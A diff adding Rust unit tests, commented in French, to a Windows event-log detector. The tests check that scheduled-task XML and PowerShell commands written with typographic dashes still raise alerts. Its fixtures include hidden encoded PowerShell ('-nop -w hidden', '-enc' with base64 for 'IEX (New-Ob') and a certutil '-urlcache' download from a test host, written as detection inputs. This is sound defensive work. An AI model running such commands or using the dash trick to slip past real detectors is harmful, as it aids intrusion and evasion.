@@ -3538,3 +3538,102 @@ fn vidage_et_usurpation_sans_le_geste_complet() {
         assert_eq!(script_suspect(texte).map(|x| x.0), attendu, "{texte}");
     }
 }
+
+// ---------------------------------------------------------------------------------------------------------------
+// Campagne n° 4 : actions de tâche à attributs, tirets typographiques
+// ---------------------------------------------------------------------------------------------------------------
+
+/// Le schéma des tâches admet un attribut `id` sur une action, et XML des blancs avant « > » : ainsi écrite, l'action
+/// se lit comme une autre (4698 et 4702 alertent), et une action qu'on ne sait pas lire n'est pas un silence.
+#[test]
+fn action_de_tache_avec_attributs() {
+    let avec = |exec: &str, ferme: &str| {
+        format!(
+            "<Task><Actions Context=\"Author\">{exec}<Command id=\"b\">powershell.exe</Command><Arguments >-nop -w hidden\
+             </Arguments ></Exec{ferme}</Actions></Task>"
+        )
+    };
+    for x in [
+        avec("<Exec id=\"a\">", ">"),
+        avec("<Exec\tid='a'>", " >"),
+        avec("<Exec id=\"a/>b\" >", ">"),
+        avec("<Exec >", "\n>"),
+    ] {
+        assert_eq!(
+            actions_de_tache(&x).0,
+            vec![("powershell.exe".to_string(), "-nop -w hidden".to_string())],
+            "{x}"
+        );
+        for id in [4698, 4702] {
+            let mut e = tache(id, "\\Essai", "", "");
+            let champ = if id == 4702 { "TaskContentNew" } else { "TaskContent" };
+            e.champs.retain(|(n, _)| n != champ);
+            e.champs.push((champ.into(), x.clone()));
+            assert_eq!(gravites(&juger(&[e]), "EVT-TAC-001"), [Gravite::Alerte], "{id} {x}");
+        }
+    }
+    // Une action vide, puis une vraie : la vraie est lue ; « <Executable> » n'est pas une action.
+    let x = "<Exec/><Executable><Command>x.exe</Command></Executable><Exec><Command>a.exe</Command></Exec>";
+    assert_eq!(actions_de_tache(x).0, vec![("a.exe".to_string(), String::new())]);
+    // Une action dont la commande ne se lit pas : une alerte, même changée (4702), jamais un silence.
+    let mut e = tache(4702, "\\Essai", "", "");
+    e.champs.retain(|(n, _)| n != "TaskContentNew");
+    e.champs
+        .push(("TaskContentNew".into(), "<Task><Actions><Exec><Command>cmd.exe".into()));
+    assert_eq!(gravites(&juger(&[e]), "EVT-TAC-001"), [Gravite::Alerte]);
+}
+
+/// PowerShell prend les tirets typographiques (–, —, ―) et le signe moins pour un « - » d'option : « –enc » est la
+/// commande encodée, « –urlcache » le téléchargement de certutil, dans un processus, une tâche ou un service.
+#[test]
+fn tirets_de_powershell() {
+    let b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBi";
+    for tiret in ["-", "/", "\u{2010}", "\u{2013}", "\u{2014}", "\u{2015}", "\u{2212}"] {
+        for option in ["enc", "ec", "e", "EncodedCommand"] {
+            let ligne = format!("powershell.exe {tiret}{option} {b64}");
+            assert_eq!(
+                ligne_suspecte("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", &ligne).map(|x| x.0),
+                Some("encode"),
+                "{ligne}"
+            );
+            let js = juger(&[tache(
+                4702,
+                "\\Essai",
+                "powershell.exe",
+                &format!("{tiret}{option} {b64}"),
+            )]);
+            assert_eq!(gravites(&js, "EVT-TAC-001"), [Gravite::Alerte], "{ligne}");
+        }
+        if tiret == "/" {
+            continue;
+        }
+        let ligne = format!("certutil.exe {tiret}urlcache {tiret}f http://x.test/a a.exe");
+        assert_eq!(
+            ligne_suspecte("C:\\Windows\\System32\\certutil.exe", &ligne).map(|x| x.0),
+            Some("systeme"),
+            "{ligne}"
+        );
+        assert_eq!(
+            script_suspect(&format!(
+                "Start-Process powershell -ArgumentList '-nop {tiret}enc SQBFAFgA'"
+            ))
+            .map(|x| x.0),
+            Some("encode"),
+            "{tiret}"
+        );
+        assert_eq!(
+            service_suspect("x", &format!("C:\\x\\a.exe {tiret}enc {b64}")).map(|x| x.0),
+            Some(Gravite::Critique),
+            "{tiret}"
+        );
+    }
+    // Un tiret dans un nom de fichier ordinaire ne fait rien tirer.
+    assert_eq!(
+        ligne_suspecte(
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "powershell.exe -File C:\\Rapports\\juin–juillet.ps1"
+        )
+        .map(|x| x.0),
+        None
+    );
+}
